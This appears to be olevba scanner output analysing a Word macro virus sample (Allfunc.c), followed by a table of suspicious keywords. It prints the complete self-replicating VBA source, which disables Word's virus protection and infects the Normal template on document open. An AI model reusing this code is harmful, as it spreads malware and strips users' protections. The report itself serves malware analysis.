olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Allfunc.c-19cb7e17161d7b34a0dd6b83939c0b6673795add
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Allfunc.c-19cb7e17161d7b34a0dd6b83939c0b6673795add - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Function IT()
Options.ConfirmConversions = 0
Options.SaveNormalPrompt = 0
Options.VirusProtection = 0
If ThisDocument = NormalTemplate Then Set Target = ActiveDocument Else Set Target = NormalTemplate
Set TargetModule = Target.VBProject.VBComponents.Item(1).CodeModule
If TargetModule.CountOfLines = 0 Then TargetModule.AddFromString "Private Sub Document_Open()" & vbCrLf & "End Sub"
If TargetModule.CountOfLines > 0 Then
For X = 1 To TargetModule.CountOfLines
If TargetModule.Lines(X, 1) = "Private Function IT()" Then GoTo Quit
Next
End If
Set Host = ThisDocument.VBProject.VBComponents.Item(1).CodeModule
For X = 1 To Host.CountOfLines
If Host.Lines(X, 1) = "Private Function IT()" Then GoTo Continue
Next
Continue:
TD = Host.Lines(X, 26)
For X = 1 To TargetModule.CountOfLines
If Left(TargetModule.Lines(X, 1), 4) = "Sub " Then TargetModule.ReplaceLine X, TargetModule.Lines(X, 1) & ": IT"
If Left(TargetModule.Lines(X, 1), 12) = "Private Sub " Then TargetModule.ReplaceLine X, TargetModule.Lines(X, 1) & ": IT"
Next
TargetModule.AddFromString TD
If Target = ActiveDocument Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
Quit:
End Function
Private Sub Document_Open(): IT
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

